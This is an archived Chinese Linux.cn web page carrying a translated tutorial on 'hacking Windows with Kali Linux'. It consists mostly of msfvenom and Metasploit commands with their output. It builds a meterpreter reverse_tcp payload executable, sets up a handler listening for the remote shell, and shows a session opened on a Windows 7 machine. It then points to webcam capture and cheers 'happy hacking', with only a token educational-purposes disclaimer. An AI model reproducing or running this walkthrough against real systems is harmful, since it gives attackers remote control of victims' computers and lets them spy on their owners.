@@ -1,0 +1,81 @@
+<!doctype html><html class=no-js lang=en><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><title>如何使用 Kali Linux 黑掉 Windows - Linux.cn Archive</title>
+<script>(function(e,t){e[t]=e[t].replace("no-js","js")})(document.documentElement,"className")</script><meta name=description content><meta property="og:title" content="如何使用 Kali Linux 黑掉 Windows"><meta property="og:description" content="请注意，我写这篇文章只是出于教育目的哦——一切因此带来的后果和本文作者、译者无关。"><meta property="og:type" content="article"><meta property="og:url" content="/article-8193-1.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2017-02-11T10:00:00+00:00"><meta property="article:modified_time" content="2017-02-11T10:00:00+00:00"><meta itemprop=name content="如何使用 Kali Linux 黑掉 Windows"><meta itemprop=description content="请注意，我写这篇文章只是出于教育目的哦——一切因此带来的后果和本文作者、译者无关。"><meta itemprop=datePublished content="2017-02-11T10:00:00+00:00"><meta itemprop=dateModified content="2017-02-11T10:00:00+00:00"><meta itemprop=wordCount content="485"><meta itemprop=keywords content="黑客,攻击,MSF,Kali,"><link rel=preconnect href=https://fonts.bunny.net crossorigin><link rel=dns-prefetch href=//fonts.bunny.net><link rel=dns-prefetch href=//fonts.bunny.net><link rel=stylesheet href="https://fonts.bunny.net/css?family=Open+Sans:400,400i,700"><link rel=stylesheet href=/css/style.css><link rel="shortcut icon" href=/favicon.ico></head><body class=body><div class="container container--outer"><header class=header><div class="container header__container"><div class=logo><a class=logo__link href=/ title="Linux.cn Archive" rel=home><div class="logo__item logo__text"><div class=logo__title>Linux.cn Archive</div></div></a></div><nav class=menu><button class=menu__btn aria-haspopup=true aria-expanded=false tabindex=0>
+<span class=menu__btn-title tabindex=-1>Menu</span></button><ul class=menu__list><li class=menu__item><a class=menu__link href=/><span class=menu__text>Home</span></a></li><li class=menu__item><a class=menu__link href=/categories/><span class=menu__text>Categories</span></a></li><li class=menu__item><a class=menu__link href=/tags/><span class=menu__text>Tags</span></a></li><li class=menu__item><a class=menu__link href><span class=menu__text>RSS</span></a></li></ul></nav></div></header><div class="wrapper flex"><div class=primary><main class=main role=main><article class=post><header class=post__header><h1 class=post__title>如何使用 Kali Linux 黑掉 Windows</h1><div class="post__meta meta"><div class="meta__item-datetime meta__item"><svg class="meta__icon icon icon-time" width="16" height="14" viewBox="0 0 30 28"><path d="M15 0C7 0 1 6 1 14s6 14 14 14 14-6 14-14S23 0 15 0zm0 25C9 25 4 20 4 14S9 3 15 3s11 5 11 11-5 11-11 11zm1-18h-2v8.4l6.8 4.4L22 18l-6-3.8V7z"/></svg><time class=meta__text datetime=2017-02-11T10:00:00Z>February 11, 2017</time></div></div></header><div class="content post__content clearfix"><p>Kali Linux 派生自 Debian Linux，主要用于渗透测试，拥有超过 300 个的预安装好的渗透测试工具。Metasploit 项目中 Metasploit 框架支持 Kali Linux 平台，Metasploit 是一个用于开发和执行 安全利用代码 （ security exploit ） 的工具。让我们来使用 Kali Linux 来攻破 Windows 吧。请注意，我写这篇文章只是出于教育目的哦——一切因此带来的后果和本文作者、译者无关。</p><p><img src=/data/attachment/album/201702/10/224036lcbuz28jyo3u4fo4.png alt></p><h3 id=源机器详情>源机器详情</h3><p>Kali Linux</p><pre tabindex=0><code>root@kali:/# uname -a
+Linux kali 4.6.0-kali1-amd64 #1 SMP Debian 4.6.4-1kali1 (2016-07-21) x86_64 GNU/Linux
+root@kali:/#
+</code></pre><p>用做攻击对象的目标机器：</p><pre tabindex=0><code>Windows 7 Ultimate SP1
+</code></pre><h3 id=步骤-1创建-payload-程序>步骤 1：创建 Payload 程序</h3><p>Payload 是一个类似于病毒或者木马的程序，可以运行在远程目标上 —— 为了黑掉那台机器。可以通过以下命令来创建 Payload（<code>program.exe</code>），以便能使用 Kali Linux 黑掉 Windows。</p><pre tabindex=0><code>root@kali:/# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.189.128 LPORT=4444 --format=exe -o /root/program.exe
+No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+No Arch selected, selecting Arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 333 bytes
+Final size of exe file: 73802 bytes
+Saved as: /root/program.exe
+root@kali:/# ls -la /root/program.exe
+-rw-r--r-- 1 root root 73802 Jan 26 00:46 /root/program.exe
+</code></pre><p>通过 <code>ls</code> 命令，我们可以确认 Payload 程序是否成功生成在指定的位置。</p><h3 id=步骤-2运行-mfsconsole-命令启动-msf-命令窗口>步骤 2：运行 <code>mfsconsole</code> 命令启动 msf 命令窗口</h3><pre tabindex=0><code>root@kali:# msfconsole
+
+
+                                   .,,.                  .
+                                .\$$$$$L..,,==aaccaacc%#s$b.       d8,    d8P
+                     d8P        #$$$$$$$$$$$$$$$$$$$$$$$$$$$b.    `BP  d888888p
+                  d888888P      &#39;7$$$$\&#34;&#34;&#34;&#34;&#39;&#39;^^`` .7$$$|D*&#34;&#39;```         ?88&#39;
+  d8bd8b.d8p d8888b ?88&#39; d888b8b            _.os#$|8*&#34;`   d8P       ?8b  88P
+  88P`?P&#39;?P d8b_,dP 88P d8P&#39; ?88       .oaS###S*&#34;`       d8P d8888b $whi?88b 88b
+ d88  d8 ?8 88b     88b 88b  ,88b .osS$$$$*&#34; ?88,.d88b, d88 d8P&#39; ?88 88P `?8b
+d88&#39; d88b 8b`?8888P&#39;`?8b`?88P&#39;.aS$$$$Q*&#34;`    `?88&#39;  ?88 ?88 88b  d88 d88
+                          .a#$$$$$$&#34;`          88b  d8P  88b`?8888P&#39;
+                       ,s$$$$$$$&#34;`             888888P&#39;   88n      _.,,,ass;:
+                    .a$$$$$$$P`               d88P&#39;    .,.ass%#S$$$$$$$$$$$$$$&#39;
+                 .a$###$$$P`           _.,,-aqsc#SS$$$$$$$$$$$$$$$$$$$$$$$$$$&#39;
+              ,a$$###$$P`  _.,-ass#S$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$####SSSS&#39;
+           .a$$$$$$$$$$SSS$$$$$$$$$$$$$$$$$$$$$$$$$$$$SS##==--&#34;&#34;&#39;&#39;^^/$$$$$$&#39;
+_______________________________________________________________   ,&amp;$$$$$$&#39;_____
+                                                                 ll&amp;&amp;$$$$&#39;
+                                                              .;;lll&amp;&amp;&amp;&amp;&#39;
+                                                            ...;;lllll&amp;&#39;
+                                                          ......;;;llll;;;....
+                                                           ` ......;;;;... .  .
+
+
+Taking notes in notepad? Have Metasploit Pro track &amp; report
+your progress and findings -- learn more on http://rapid7.com/metasploit
+
+       =[ metasploit v4.12.22-dev                         ]
++ -- --=[ 1577 exploits - 906 auxiliary - 272 post        ]
++ -- --=[ 455 payloads - 39 encoders - 8 nops             ]
++ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
+
+msf &gt;
+</code></pre><h3 id=步骤-3进行漏洞利用的细节>步骤 3：进行漏洞利用的细节</h3><ul><li>4444 端口：你可以按照自己的想法来选择使用哪个端口</li><li>LHOST IP：表示 Kali Linux 机器的 IP，这里是 192.168.189.128。 使用如下命令来查看你的 Kali Linux 机器的 IP。</li></ul><pre tabindex=0><code>root@kali:/# ip r l
+192.168.189.0/24 dev eth0  proto kernel  scope link  src 192.168.189.128  metric 100
+root@kali:/#
+</code></pre><p>现在在 msf 命令窗口使用 <code>use exploit/multi/handler</code> 命令，如下：</p><pre tabindex=0><code>msf &gt; use exploit/multi/handler
+msf exploit(handler) &gt;
+</code></pre><p>然后在接下来的命令窗口中使用命令 <code>set payload windows/meterpreter/reverse_tcp</code>：</p><pre tabindex=0><code>msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp
+payload =&gt; windows/meterpreter/reverse_tcp
+</code></pre><p>现在使用 LHOST 和 LPORT 来设置本地 IP 和本地端口，如下：</p><pre tabindex=0><code>msf exploit(handler) &gt; set lhost 192.168.189.128
+lhost =&gt; 192.168.189.128
+msf exploit(handler) &gt; set lport 4444
+lport =&gt; 4444
+</code></pre><p>最后使用 <code>exploit</code> 命令。</p><pre tabindex=0><code>msf exploit(handler) &gt; exploit
+
+[*] Started reverse TCP handler on 192.168.189.128:4444
+[*] Starting the payload handler...
+</code></pre><p>现在你需要在 Windows 上运行 <code>program.exe</code>，一旦它在目标机器上执行，你就可以建立一个 meterpreter 会话。输入 <code>sysinfo</code> 就可以得到这台被黑掉的 Windows 机器的详情。</p><pre tabindex=0><code>msf exploit(handler) &gt; exploit
+
+[*] Started reverse TCP handler on 192.168.189.128:4444
+[*] Starting the payload handler...
+[*] Sending stage (957999 bytes) to 192.168.189.1
+[*] Meterpreter session 1 opened (192.168.189.128:4444 -&gt; 192.168.189.1:53091) at 2017-01-26 00:51:31 +0000
+
+meterpreter &gt; sysinfo
+Computer        : MANN-PC
+OS              : Windows 7 (Build 7601, Service Pack 1).
+Architecture    : x64 (Current Process is WOW64)
+System Language : en_IN
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x86/win32
+</code></pre><p>一旦你得到了这些详细信息，就可以做更多的漏洞利用，或者通过 <code>help</code> 命令获取更多信息，以便列出你可以黑掉该系统的所有选项，比如 <code>webcam_snap</code> 命令获取网络摄像头，同样你还可以使用其他更多的可用选项。祝你入侵愉快！！！！ ←_←</p><hr><p>作者简介：</p><p>嗨，我是 Manmohan Mirkar。很高兴认识你。我接触 Linux 是在十年前，我做梦也没想到我有现在这样的收获。我的愿望就是让你学到 Linux 的知识，谢谢你的阅读。</p><p>译者简介：</p><p><a href=http://GHLandy.com>GHLandy</a> —— 划不完粉腮柳眉泣别离。</p><hr><p>via: <a href=http://www.linuxroutes.com/quick-guide-how-to-hack-windows-with-kali-linux/>http://www.linuxroutes.com/quick-guide-how-to-hack-windows-with-kali-linux/</a></p><p>作者：<a href=http://www.linuxroutes.com/quick-guide-how-to-hack-windows-with-kali-linux/>Manmohan Mirkar</a> 译者：<a href=https://github.com/GHLandy>GHLandy</a> 校对：<a href=https://github.com/wxy>wxy</a></p><p>本文由 <a href=https://github.com/LCTT/TranslateProject>LCTT</a> 原创编译，<a href=https://linux.cn/>Linux中国</a> 荣誉推出</p></div><footer class=post__footer><div class="post__tags tags clearfix"><svg class="tags__badge icon icon-tag" width="16" height="16" viewBox="0 0 32 32"><path d="M32 19c0 1-1 2-1 2L21 31s-1 1-2 1-2-1-2-1L2 16c-1-1-1.4-2-1.4-2S0 12.5.0 11V3C0 1.5.8.8.8.8S1.5.0 3 0h8c1.5.0 3 .6 3 .6S15 1 16 2l15 15s1 1 1 2zM7 10a3 3 0 100-6 3 3 0 000 6z"/></svg><ul class=tags__list><li class=tags__item><a class="tags__link btn" href=/tags/%E9%BB%91%E5%AE%A2/ rel=tag>黑客</a></li><li class=tags__item><a class="tags__link btn" href=/tags/%E6%94%BB%E5%87%BB/ rel=tag>攻击</a></li><li class=tags__item><a class="tags__link btn" href=/tags/msf/ rel=tag>MSF</a></li><li class=tags__item><a class="tags__link btn" href=/tags/kali/ rel=tag>Kali</a></li></ul></div></footer></article></main></div></div><footer class=footer><div class="container footer__container flex"><div class=footer__copyright>&copy; 2025 Linux.cn Archive.
+<span class=footer__copyright-credits>Generated with <a href=https://gohugo.io/ rel="nofollow noopener" target=_blank>Hugo</a> and <a href=https://github.com/Vimux/Mainroad/ rel="nofollow noopener" target=_blank>Mainroad</a> theme.</span></div></div></footer></div><script async defer src=/js/menu.js></script></body></html>
